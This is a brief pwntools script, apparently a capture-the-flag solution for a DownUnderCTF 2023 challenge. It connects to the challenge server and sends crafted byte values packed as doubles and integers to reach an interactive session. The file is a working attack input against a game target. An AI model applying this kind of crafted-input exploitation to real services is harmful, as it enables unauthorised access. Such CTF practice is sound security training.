from pwn import *
from struct import *
r = remote('2023.ductf.dev', 30024)
r.sendline(str(unpack('<d', b'\x19\x34\xff\xff\xff\xff\x00\x00')[0]).encode())
r.sendline(str(u32(b'FLAG')).encode())
r.sendline(pack('<d', 1.6180339887))
r.interactive()
